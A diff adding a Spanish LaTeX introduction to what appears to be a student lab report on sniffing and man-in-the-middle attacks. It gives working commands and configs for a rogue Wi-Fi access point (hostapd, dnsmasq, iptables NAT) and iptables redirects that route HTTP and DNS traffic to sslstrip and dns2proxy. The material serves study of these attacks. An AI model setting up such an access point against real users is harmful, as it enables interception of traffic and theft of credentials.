@@ -1,0 +1,101 @@
+\section{Introducción}
+
+\subsection{Objetivo}
+El sniffing es la actividad por la cual se capturan, analizan y monitorean los paquetes que viajan por una red de computadoras. El MitM es un tipo de ataque
+que nos permite no solo capturar los paquetes, sino también modicarlos o destruirlos antes de que lleguen a destino. En este trabajo práctico nos enfocaremos 
+en montar un rogue AP, el cual nos permitirá hacernos pasar por una red confiable y luego poder sniffear o hacer MitM de los paquetes de los dispositivos 
+conectados a la red.
+
+\subsection{Herramientas que utilizamos}
+
+Para poder montar el rogue AP, hacer sniffing y luego MitM, utilizamos la siguientes herramientas:
+
+\begin{itemize}
+	\item hostapd
+	\item dnsmasq
+	\item Wireshark
+	\item tcpdump
+	\item httpry
+	\item sslstrip
+	\item MITMf (sslstrip2 y dns2proxy)
+	\item bettercap
+\end{itemize}
+
+\subsection{Configuración}
+Para poder implementar el rogue AP y comenzar a sniffear tráfico decidimos trabajar sobre la distribución Kali linux en conjunto con 2 interfaces de red wireless. 
+Una que nos proporcionará acceso a internet y la otra (como dongle USB) la utilizaremos para montar el rogue AP. 
+
+La imagen de Kali linux la descargamos de la página de Offensive Security (https://www.offensive-security.com/kali-linux-vmware-virtualbox-image-download/), 
+la cual provee imagenes de Kali configuradas para funcionar en VirtualBox, VMWare, etc. . En nuestro caso utilizamos la imagen de VMWare. Para montar el rogue AP, 
+utilizaremos la herramienta hostapd que nos permite levantar un AP rápidamente. Para lograrlo, realizamos los siguientes pasos:
+
+\begin{enumerate}
+
+	\item Instalamos hostapd y luego lo configuramos con la información del AP que queremos levantar
+	
+		\begin{lstlisting}[language=bash]
+		
+			$ sudo apt install hostapd
+
+			---- /etc/hostapd/hostapd.conf ----
+			interface=wlan0
+			driver=nl80211
+			ssid=RoqueAPWifi
+			channel=6
+			--------------------------------------------
+
+		\end{lstlisting}
+		
+		
+	\item Configuramos el rango de IP que va a utilizar nuestra interfaz que va funcionar como rogue AP (wlan0 en nuestro caso) con ifconfig
+		
+		\begin{lstlisting}[language=bash]
+			$ ifconfig wlan0 10.0.0.1/24 up
+		\end{lstlisting}
+		
+	\item Configuramos IP forwarding para que los paquetes de nuestra interfaz wlan0 (rogue AP) forwardee a la interfaz eth0 (la cual es la que provee conexion a internet).
+		
+		\begin{lstlisting}[language=bash]
+			$ iptables -t nat -F
+			$ iptables -F
+			$ iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+			$ iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
+			$ echo '1' > /proc/sys/net/ipv4/ip_forward
+		\end{lstlisting}
+		
+	\item Instalamos y configuramos dnsmasq
+		
+		\begin{lstlisting}[language=bash]
+			$ sudo apt install dnsmasq
+			
+			--- /etc/dnsmasq.conf ---
+			log-facility=/var/log/dnsmasq.log
+			interface=wlan0
+			dhcp-range=10.0.0.10,10.0.0.250,12h
+			dhcp-option=3,10.0.0.1
+			dhcp-option=6,10.0.0.1
+			log-queries
+			---------------------------------
+			
+		\end{lstlisting}
+		
+	\item Finalmente, inicializamos los servicios hostapd y dnsmasq
+		
+		\begin{lstlisting}[language=bash]
+			$ service dnsmasq start	
+			$ service hostapd start
+		\end{lstlisting}
+	
+\end{enumerate}
+	
+Para poder ejecutar todas estas configuraciones y levantar el ap rápidamente para hacer varias pruebas, generamos un script que realiza todos estos pasos 
+llamado ap.sh. Luego de cargar todo esto en nuestra imagen, ejecutamos el script y logramos tener un AP funcionando al cual nos podemos conectar para poder
+realizar nuestras pruebas de sniffing y MitM.
+
+Luego, para hacer MitM, hicimos algunas modificaciones para poder utilizar otros servicios que nos permitan interceptar y modificar los paquetes. Estas modificaciones 
+son para poder usar SSLStrip y dns2proxy y fueron incluidas también en el script ap.sh.
+
+\begin{lstlisting}[language=bash]
+	$ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+	$ iptables -t nat -A PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 53	
+\end{lstlisting}
